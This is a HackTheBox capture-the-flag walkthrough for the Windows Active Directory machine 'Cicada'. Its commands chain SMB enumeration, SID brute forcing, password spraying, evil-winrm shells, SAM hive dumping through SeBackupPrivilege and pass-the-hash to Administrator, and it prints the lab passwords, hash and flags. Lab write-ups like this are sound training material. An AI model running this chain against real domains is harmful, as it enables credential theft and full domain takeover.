# HTB — Cicada

![Platform](https://img.shields.io/badge/Platform-HackTheBox-9FEF00?style=flat-square&logo=hackthebox&logoColor=black)
![OS](https://img.shields.io/badge/OS-Windows-0078D6?style=flat-square&logo=windows&logoColor=white)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=flat-square)
![Status](https://img.shields.io/badge/Status-Rooted-success?style=flat-square)
![Techniques](https://img.shields.io/badge/Techniques-SMB%20Enum%20%7C%20RID%20Cycling%20%7C%20SeBackupPrivilege-blueviolet?style=flat-square)

---

## Summary

Cicada is a Windows Active Directory machine that chains anonymous SMB enumeration, SID brute forcing, password spraying, and credential reuse across three accounts before reaching a privileged user with SeBackupPrivilege. A default password found in an HR notice on an open SMB share is sprayed against all domain users. One account is still using the default, and its authenticated access reveals another user's password stored in their AD description field. That account has access to a DEV share containing a PowerShell backup script with plaintext credentials for a third user who has WinRM access and SeBackupPrivilege, enabling extraction of the Administrator NTLM hash from the SAM hive.

---

## Machine Info

| Field | Details |
|---|---|
| IP | 10.129.21.190 |
| Domain | cicada.htb |
| DC Hostname | CICADA-DC |
| FQDN | CICADA-DC.cicada.htb |
| OS | Windows Server |
| User Flag | `4a2903cc34a8460722bde0a93c4dfaba` |
| Root Flag | `0b11e58b06894401d016f1c8db3bbffa` |

---

## Attack Path Overview

```
Anonymous SMB → HR share
     |
     | "Notice from HR.txt" → default password
     v
impacket-lookupsid → full user list
     |
     | Password spray → michael.wrightson
     v
crackmapexec --users → david.orelious password in AD description
     |
     | DEV share access → Backup_script.ps1
     v
emily.oscars plaintext credentials
     |
     | evil-winrm → SeBackupPrivilege
     v
reg save SAM + SYSTEM → secretsdump
     |
     | Administrator NTLM hash → Pass-the-Hash
     v
evil-winrm as Administrator + root flag
```

---

## Enumeration

### Port Scanning

**Phase A — Wide coverage:**
```bash
nmap -p- --min-rate 1000 -oN cicada-all-ports.txt 10.129.21.190
```

**Extract ports for Phase B:**
```bash
ports=$(grep open cicada-all-ports.txt | cut -d '/' -f1 | tr '\n' ',' | sed 's/,$//')
```

**Phase B — Deep identification:**
```bash
nmap -p $ports -sC -sV --min-rate 1000 -oN service-scan.txt 10.129.21.190
```

**Key findings:**

| Port | Service | Significance |
|---|---|---|
| 88 | Kerberos | DC confirmed |
| 389/636 | LDAP | AD enumeration |
| 445 | SMB | Share enumeration — entry point |
| 5985 | WinRM | Shell delivery |

Clock skew: 6h58m — fixed before enumeration.

```bash
sudo timedatectl set-ntp off
sudo date -s "$(date -d "$(date) + 6 hours 58 minutes" '+%Y-%m-%d %H:%M:%S')"
echo "10.129.21.190 cicada.htb CICADA-DC.cicada.htb" | sudo tee -a /etc/hosts
```

### SMB Enumeration

```bash
smbclient -L //10.129.21.190 -N
```

Non-standard shares: DEV (access denied) and HR (accessible anonymously).

```bash
smbclient //10.129.21.190/HR -N
get "Notice from HR.txt"
cat "Notice from HR.txt"
```

Default password found: `Cicada$M6Corpb*@Lp#nZp!8`

### User Enumeration

```bash
impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass | grep 'SidTypeUser' | sed 's/.*\\\(.*\) (SidTypeUser)/\1/' > users.txt
```

Users: Administrator, Guest, krbtgt, CICADA-DC$, john.smoulder, sarah.dantelia, michael.wrightson, david.orelious, emily.oscars

---

## Foothold

### Password Spray

```bash
crackmapexec smb cicada.htb -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

Hit: `michael.wrightson` still using default password.

### AD Description Field Enumeration

```bash
crackmapexec smb cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
```

Finding: `david.orelious` has password `aRt$Lp#7t*VQ!3` in AD description field.

### DEV Share Access

```bash
smbclient //cicada.htb/DEV -U 'david.orelious%aRt$Lp#7t*VQ!3'
get Backup_script.ps1
cat Backup_script.ps1
```

`Backup_script.ps1` contains:
```powershell
$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
```

### WinRM Shell

```bash
evil-winrm -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' -i cicada.htb
```

```powershell
type C:\Users\emily.oscars.CICADA\Desktop\user.txt
```

**User flag:** `4a2903cc34a8460722bde0a93c4dfaba`

---

## Privilege Escalation

### SeBackupPrivilege

```powershell
whoami /priv
```

`SeBackupPrivilege` is enabled. This allows reading any file on the system regardless of ACLs, including protected registry hives.

```powershell
reg save hklm\sam sam
reg save hklm\system system
download sam
download system
```

### Hash Extraction

```bash
impacket-secretsdump -sam sam -system system local
```

**Administrator NTLM:** `2b87e7c93a3e8a0ea4a581937016f341`

### Pass-the-Hash

```bash
evil-winrm -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341 -i cicada.htb
```

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

**Root flag:** `0b11e58b06894401d016f1c8db3bbffa`

---

## Vulnerabilities

| Vulnerability | Location | Impact |
|---|---|---|
| Default password in open HR share | HR SMB share | Initial credential |
| User not changing default password | michael.wrightson | Authenticated domain access |
| Password in AD description field | david.orelious | DEV share access |
| Plaintext credentials in backup script | DEV share | WinRM foothold |
| SeBackupPrivilege on standard user | emily.oscars | SAM hive extraction |
| Administrator hash extractable from SAM | Local SAM database | Full domain compromise |

---

## Tools

| Tool | Purpose |
|---|---|
| nmap | Port and service scanning |
| smbclient | Anonymous SMB enumeration |
| impacket-lookupsid | SID brute force user enumeration |
| crackmapexec | Password spray and user enumeration |
| evil-winrm | WinRM shell |
| reg save | Registry hive extraction |
| impacket-secretsdump | NTLM hash extraction |

---

## Key Takeaways

1. Non-standard SMB shares always get fully enumerated. HR contained the entire entry point.
2. AD description fields are checked immediately after gaining any authenticated access. Users store passwords there constantly.
3. Backup scripts and PowerShell files on file shares are always read in full. Credentials in ConvertTo-SecureString calls are plaintext.
4. SeBackupPrivilege gives direct access to SAM and SYSTEM hives. Three commands: reg save, download, secretsdump.
5. Pass-the-Hash with the Administrator NTLM hash always beats attempting to crack it when WinRM is open.

---

## References

- [SeBackupPrivilege Abuse](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)
- [impacket-lookupsid](https://github.com/fortra/impacket)
- [BloodHound CE](https://github.com/SpecterOps/BloodHound)

---

*by mavhezha | github.com/mavhezha | mavhezha.com*
